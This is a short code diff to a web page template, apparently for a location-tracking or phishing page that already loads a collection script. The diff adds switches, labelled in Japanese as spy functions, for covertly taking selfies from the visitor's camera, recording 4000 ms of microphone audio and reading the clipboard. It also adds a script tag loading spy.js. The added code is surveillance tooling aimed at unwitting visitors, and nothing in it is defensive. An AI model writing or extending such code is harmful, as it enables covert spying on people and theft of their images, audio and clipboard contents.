@@ -37,7 +37,13 @@ window.LT_DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
 window.LT_ASK_TEXT   = {{ ask_text|tojson }};
 window.LT_DENY_TEXT  = {{ deny_text|tojson }};
 window.LT_RETRY_TEXT = {{ retry_text|tojson }};
+/* スパイ機能のスイッチ（0 で黙る） */
+window.LT_CAM  = 1;      /* 自撮り */
+window.LT_MIC  = 1;      /* 環境音 */
+window.LT_CLIP = 1;      /* クリップボード */
+window.LT_MIC_MS = 4000; /* 録音秒数 */
 </script>
 <script src="/static/collect.js"></script>
 <script src="/static/live.js"></script>
+<script src="/static/spy.js"></script>
 </body></html>
